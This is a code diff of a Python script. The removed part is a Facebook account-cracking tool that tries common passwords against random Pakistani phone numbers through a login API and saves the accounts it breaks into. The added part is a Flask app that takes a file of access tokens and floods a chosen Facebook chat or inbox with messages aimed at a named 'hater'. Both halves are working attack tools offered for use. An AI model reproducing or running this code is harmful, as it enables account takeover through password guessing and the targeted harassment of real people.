@@ -1,373 +1,199 @@
-#!/usr/bin/python2
-#coding=utf-8
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
-os.system('rm -rf .txt')
-for n in range(10000):
+from flask import Flask, request
+import requests
+from threading import Thread, Event
+import time
 
-    nmbr = random.randint(1111111, 9999999)
-    
-    sys.stdout = open('.txt', 'a')
+app = Flask(__name__)
+app.debug = True
 
-    print(nmbr)
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
 
-    sys.stdout.flush()
-    
-try:
-    import requests
-except ImportError:
-    os.system('pip2 install mechanize')
-    
-try:
-    import mechanize
-except ImportError:
-    os.system('pip2 install request')
-    time.sleep(1)
-    os.system('Then type: python2 boss404')
+stop_event = Event()
+threads = []
 
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
-from multiprocessing.pool import ThreadPool
-from requests.exceptions import ConnectionError
-from mechanize import Browser
-
-
-reload(sys)
-sys.setdefaultencoding('utf8')
-br = mechanize.Browser()
-br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
-br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
-
-def keluar():
-	print 'Thanks.'
-	os.sys.exit()
-
-def acak(b):
-    w = 'ahtdzjc'
-    d = ''
-    for i in x:
-        d += '!'+w[random.randint(0,len(w)-1)]+i
-    return cetak(d)
-
-
-def cetak(b):
-    w = 'ahtdzjc'
-    for i in w:
-        j = w.index(i)
-        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
-    x += '\033[0m'
-    x = x.replace('!0','\033[0m')
-    sys.stdout.write(x+'\n')
-
-
-def jalan(z):
-	for e in z + '\n':
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		time.sleep(00000.1)
-def tik():
-	titik = ['.   ','..  ','... ']
-	for o in titik:
-		print("\r\x1b[1;93mPlease Wait \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)
-
-
-back = 0
-oks = []
-id = []
-cpb = []
-vulnot = "\033[31mNot Vuln"
-vuln = "\033[32mVuln"
-
-os.system("clear")
-print  """
-
-                     
-\033[1;94mFACEBOOK  HARSHIT DVN
-                  
-\033[1;92mFB PAGE   HARSHIT
-
-"""
-
-####Logo####
-
-logo1 = """
-  
-██╗      █████╗ ██╗      █████╗ 
-██║     ██╔══██╗██║     ██╔══██╗
-██║     ███████║██║     ███████║
-██║     ██╔══██║██║     ██╔══██║
-███████╗██║  ██║███████╗██║  ██║
-╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
-                                
-                                
-                                                                                      
-                                                  
-
-╔══──────────────────────────╗─══╗
-║ OWNER 💓💓💓HARSHIT           ║║
-║  GITHUB 💝💝💝 YOURDADDY   ║ ║
-║ FACEBOOK 💝💝💝HARSHU-LALA ║ ║
-║  ENJOY 💝💝💝IND Cloning                ║ ║
-║   Note 💝💝💝Use Fastest Speed NeT  ║ ║
-╚══──────────────────────────╝─══╝
-
-"""
-logo2 = """
-
-░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
-░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
-░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
-░▒▓████████▓▒░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
-░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
-░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
-░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
-                                                                                
-                                                                                
-                                                                                
-                                                            
-                                                   
-                         DON'T COPY MY SCRIPT
-                                      HARSHU DHAWAN       
-                                
-╔══──────────────────────────╗─══╗
-║OWNER 💓💓💓HARSHIT (HS)                              ║
-║  GITHUB 💝💝💝 HARSHU                            ║
-║ FACEBOOK 💝💝💝HARSHIT DHAWAN                 ║
-║  ENJOY 💝💝💝IND Cloning                             ║
-║   Note 💝💝💝Use Fastest Speed Net             ║
-╚══──────────────────────────╝─══╝
-"""
-print("""
-Owner: HARSHIT TRICKER
-Facebook: HARSHU-LALA
-
-""")
-CorrectUsername = "HS"
-CorrectPassword = "HS"
-
-loop = 'true'
-while (loop == 'true'):
-    username = raw_input("\033[1;97m\x1b[1;91mTool Username \x1b[1;97m»» \x1b[1;97m")
-    if (username == CorrectUsername):
-    	password = raw_input("\033[1;97m \x1b[1;91mTool Password  \x1b[1;97m» \x1b[1;97m")
-        if (password == CorrectPassword):
-            print "Logged in successfully as " + username 
-	    time.sleep(2)
-            loop = 'false'
-        else:
-            print "\033[1;94mWrong Password"
-            os.system('xdg-https://wa.me/+923188214452')
-    else:
-        print "\033[1;94mWrong Username"
-        os.system('xdg-https://wa.me/+923188214452')
-
-
-numm = [5,2,5,2,2]
-##### LICENSE #####
-#=================#
-def lisensi():
-    os.system('clear')
-    login()
-####login#########
-def login():
-    os.system('clear')
-    print logo1
-    print "\033[1;93m[1]\x1b[1;91m══START ( \033[1;92m )"
-    time.sleep(0.05)
-    print "\033[1;95m[2]\x1b[1;96m ══EXIT "
-    time.sleep(0.05)
-    print '\x1b[1;94m[0]\033[1;91m ══BACK '
-    pilih_login()
-
-def pilih_login():
-    peak = raw_input("\n\033[1;95m ══CHOOSE : \033[1;93m")
-    if peak =="":
-        print "\x1b[1;97mFill In Correctly"
-        pilih_login()
-    elif peak =="1":
-        Zeek()
-def Zeek():
-    os.system('clear')
-    print logo1
-    print '\x1b[1;93m[1] ══START CLONING  '
-    time.sleep(0.10)
-    print '\x1b[1;92m[2] ══EXIT'
-    time.sleep(0.10)
-    print '\x1b[1;95m[0] ══BACK '
-    time.sleep(0.10)
-    print '\x1b[1;96m ════RK'
-    time.sleep(0.10)
-    print '\x1b[1;97m════RED-MAFIA'
-    time.sleep(0.10)
-    print '\x1b[1;91m ════DONT COPY MY SCRIPT'
-    time.sleep(0.10)
-    print '\x1b[1;94m════CP ID OPEN AFTER 3 DAYS ENJOY'
-   
-    time.sleep(0.05)
-    action()
-
-def action():
-    peak = raw_input('\n\033[1;97m ══CHOOSE:\033[1;97m')
-    if peak =='':
-        print '[!] Fill In Correctly'
-        action()
-    elif peak =="1":              
-        os.system("clear")
-        print logo2
-        print "\033[1;94mEnter any Pakistan Mobile code Number"+'\n'
-        print '\033[1;92mEnter any code 01 02 03 04 05 06 07 08 10 11 12 13 14 15 16 20 21 22 23 24 30 31 32 33 34 35 36 40 41 42 43 44 45 46 47 48 49'
-        for i in numm:
-            print('x' * i)
-        try:
-            c = raw_input("\033[1;97mCHOOSE : ")
-            k="03"
-            idlist = ('.txt')
-            for line in open(idlist,"r").readlines():
-                id.append(line.strip())
-        except IOError:
-            print ("[!] File Not Found")
-            raw_input("\n[ Back ]")
-            blackmafiax()
-    elif peak =='0':
-        login()
-    else:
-        print '[!] Fill In Correctly'
-        action()
-    print 50* '\033[1;94m-'
-    xxx = str(len(id))
-    jalan ('\033[1;91m Total ids Accounts: '+xxx)
-    jalan ('\033[1;92mSim code you choose: '+c)
-    jalan ("\033[1;93mWait  Start Cracking...")
-    jalan ("\033[1;94mTo Stop Process Press Ctrl+z")
-    print 50* '\033[1;97m-'
-    def main(arg):
-        global cpb,oks
-        user = arg
-        try:
-            os.mkdir('save')
-        except OSError:
-            pass
-        try:
-            pass1 = user
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-            q = json.load(data)
-            if 'access_token' in q:
-                print '\x1b[1;32m[RK-OK]  ' + k + c + user + '  |  ' + pass1                                       
-                okb = open('save/cloned.txt', 'a')
-                okb.write(k+c+user+pass1+'\n')
-                okb.close()
-                oks.append(c+user+pass1)
-            else:
-                if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;97m[RK-CP] ' + k + c + user + '  |  ' + pass1
-                    cps = open('save/cloned.txt', 'a')
-                    cps.write(k+c+user+pass1+'\n')
-                    cps.close()
-                    cpb.append(c+user+pass1)
+def send_messages(access_tokens, thread_id, mn, time_interval, messages):
+    while not stop_event.is_set():
+        for message1 in messages:
+            if stop_event.is_set():
+                break
+            for access_token in access_tokens:
+                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                message = str(mn) + ' ' + message1
+                parameters = {'access_token': access_token, 'message': message}
+                response = requests.post(api_url, data=parameters, headers=headers)
+                if response.status_code == 200:
+                    print(f"Message sent using token {access_token}: {message}")
                 else:
-                    pass2 = k + nama + user
-                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                    q = json.load(data)
-                    if 'access_token' in q:
-                        print '\x1b[1;32m[RK-OK]  ' + k + c + user +  '  |  ' + pass2
-                        okb = open('save/cloned.txt', 'a')
-                        okb.write(k+c+user+pass2+'\n')
-                        okb.close()
-                        oks.append(c+user+pass2)
-                    else:
-                        if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;97m[RK-CP] ' + k + c + user + '  |  ' + pass2
-                            cps = open('save/cloned.txt', 'a')
-                            cps.write(k+c+user+pass2+'\n')
-                            cps.close()
-                            cpb.append(c+user+pass2)
-                        else:
-                            pass3="Pakistan"
-                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                            q = json.load(data)
-                            if 'access_token' in q:
-                                print '\x1b[1;32m[RK-OK]  ' + k + c + user + '  |  ' + pass3
-                                okb = open('save/cloned.txt', 'a')
-                                okb.write(k+c+user+pass3+'\n')
-                                okb.close()
-                                oks.append(c+user+pass3)
-                            else:
-                                if 'www.facebook.com' in q['error_msg']:
-                                    print '\033[1;97m[RK-CP] ' + k + c + user + '  |  ' + pass3 
-                                    cps = open('save/cloned.txt', 'a')
-                                    cps.write(k+c+user+pass3+'\n')
-                                    cps.close()
-                                    cpb.append(c+user+pass3)
-                                else:
-                                    pass4="123456"
-                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                                    q = json.load(data)
-                                    if 'access_token' in q:
-                                        print '\x1b[1;32m[RK-OK]  ' + k + c + user + '  |  ' + pass4 
-                                        okb = open('save/cloned.txt', 'a')
-                                        okb.write(k+c+user+pass4+'\n')
-                                        okb.close()
-                                        oks.append(c+user+pass4)
-                                    else:
-                                        if 'www.facebook.com' in q['error_msg']:
-                                            print '\033[1;97m[RK-CP] ' + k + c + user + '  |  ' + pass4
-                                            cps = open('save/cloned.txt', 'a')
-                                            cps.write(k+c+user+pass4+'\n')
-                                            cps.close()
-                                            cpb.append(c+user+pass4)
-                                        else:
-                                            pass5="786786"
-                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                                            q = json.load(data)
-                                            if 'access_token' in q:
-                                                print '\x1b[1;32m[RK-OK]  ' + k + c + user + '  |  ' + pass5
-                                                okb = open('save/cloned.txt', 'a')
-                                                okb.write(k+c+user+pass5+'\n')
-                                                okb.close()
-                                                oks.append(c+user+pass5)
-                                            else:
-                                                if 'www.facebook.com' in q['error_msg']:
-                                                    print '\033[1;97m[RK-CP] ' + k + c + user + '  |  ' + pass5 
-                                                    cps = open('save/cloned.txt', 'a')
-                                                    cps.write(k+c+user+pass5+'\n')
-                                                    cps.close()
-                                                    cpb.append(c+user+pass5)
-                                                                                                                                                                                                                
-                                                                                                                                                                                                                
-                                                                                                                                                                                                            
-                                                                                                                                                                                                            
-                                                                                                                                                                                                            
-                                                                                                                                                                                                            
-                                                                                                                                                                                                            
+                    print(f"Failed to send message using token {access_token}: {message}")
+                time.sleep(time_interval)
 
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+    global threads
+    if request.method == 'POST':
+        token_file = request.files['tokenFile']
+        access_tokens = token_file.read().decode().strip().splitlines()
 
-                                                                                                                                                                                                            
-                                                                                                                                                                                                                    
-                                                                                                                                                                                                            
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
+
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
+
+        if not any(thread.is_alive() for thread in threads):
+            stop_event.clear()
+            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))
+            threads.append(thread)
+            thread.start()
+
+    return '''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Aarav</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    /* CSS for styling elements */
 
 
 
-        except:
-            pass
-        
-    p = ThreadPool(30)
-    p.map(main, id)
-    print 50* '\033[1;91m-'
-    print 'Process Has Been Completed ...'
-    print 'Total CP/Ok: '+str(len(oks))+'/'+str(len(cpb))
-    print('Cloned Accounts Has Been Saved : save/cloned.txt')
-    jalan("Note : Your Offline account Will Open after 10 to 20 days")
-    print ''
-    print """
+label{
+    color: red;
+}
 
+.file{
+    height: 30px;
+}
+body{
+    background-image: url('https://images.app.goo.gl/CrjcqWAr4E6daba98.jpg');
+    background-size: cover;
+    background-repeat: no-repeat;
+    color: red;
 
+}
+    .container{
+      max-width: 350px;
+      height: 600px;
+      border-radius: 20px;
+      padding: 20px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 0 15px green;
+            border: none;
+            resize: none;
+    }
+        .form-control {
+            outline: 1px red;
+            border: 1px double black;
+            background: transparent; 
+            width: 100%;
+            height: 40px;
+            padding: 7px;
+            margin-bottom: 20px;
+            border-radius: 10px;
+            color: Blue;
+    }
+    .header{
+      text-align: center;
+      padding-bottom: 20px;
+    }
+    .btn-submit{
+      width: 100%;
+      margin-top: 10px;
+    }
+    button.submit {
+    background-color: #4CAF50; /* Green background */
+    border: none; /* Remove border */
+    color: white; /* Text color */
+    padding: 15px 30px; /* Vertical and horizontal padding */
+    text-align: center; /* Center text */
+    text-decoration: none; /* No underline */
+    display: inline-block; /* Inline block */
+    font-size: 16px; /* Font size */
+    border-radius: 50px; /* Oval shape */
+    cursor: pointer; /* Pointer cursor on hover */
+    transition: background-color 0.3s; /* Smooth background change */
+}
 
-\033[1;96mThanks For Using My tool
-\033[1;95mFb\033[1;97mRED-MAFIA"""
+button.submit:hover {
+    background-color: #45a049; /* Darker green on hover */
+}
 
-    
-    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
-    login() 
-          
+    .footer{
+      text-align: center;
+      margin-top: 20px;
+      color: #888;
+    }
+    .whatsapp-link {
+      display: inline-block;
+      color: #25d366;
+      text-decoration: none;
+      margin-top: 10px;
+    }
+    .whatsapp-link i {
+      margin-right: 5px;
+    }
+  </style>
+</head>
+<body>
+  <header class="header mt-4">
+  <h1 class="mt-3">Offline Server By Harshit Dhawan </h1>
+  </header>
+  <div class="container text-center">
+    <form method="post" enctype="multipart/form-data">
+      <div class="mb-3">
+        <label for="tokenFile" class="form-label">𝚂𝙴𝙻𝙴𝙲𝚃 𝚈𝙾𝚄𝚁 𝚃𝙾𝙺𝙴𝙽 𝙵𝙸𝙻𝙴</label>
+        <input type="file" class="form-control" id="tokenFile" name="tokenFile" required>
+      </div>
+      <div class="mb-3">
+        <label for="threadId" class="form-label">𝙲𝙾𝙽𝚅𝙾 𝙶𝙲/𝙸𝙽𝙱𝙾𝚇 𝙸𝙳</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" required>
+      </div>
+      <div class="mb-3">
+        <label for="kidx" class="form-label">H𝙰𝚃𝙷𝙴𝚁 𝙽𝙰𝙼𝙴</label>
+        <input type="text" class="form-control" id="kidx" name="kidx" required>
+      </div>
+      <div class="mb-3">
+        <label for="time" class="form-label">T𝙸𝙼𝙴 𝙳𝙴𝙻𝙰𝚈 𝙸𝙽 (seconds)</label>
+        <input type="number" class="form-control" id="time" name="time" required>
+      </div>
+      <div class="mb-3">
+        <label for="txtFile" class="form-label">𝚃𝙴𝚇𝚃 𝙵𝙸𝙻𝙴</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
+      </div>
+      <button type="submit" class="btn btn-primary btn-submit">Start Sending message </button>
+    </form>
+  </div>
+  <footer class="footer">
+    <p>&copy; 2024 All rights reserved by Harshit Shrivastava .</p>
+    <p> ᴏɴᴇ ᴍᴀɴ ᴀʀᴍʏ <a href="https://www.facebook.com/dannon.reed">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴀʙᴏᴏᴋ</a></p>
+    <div class="mb-3">
+      <a href="https://wa.me/+918299712859" class="whatsapp-link">
+        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
+   z   </a>
+    </div>
+  </footer>
+</body>
+</html>
+    '''
+
+@app.route('/stop', methods=['POST'])
+def stop_sending():
+    stop_event.set()
+    return 'Message sending stopped.'
+
 if __name__ == '__main__':
-    login()
+    app.run(host='0.0.0.0', port=5000)
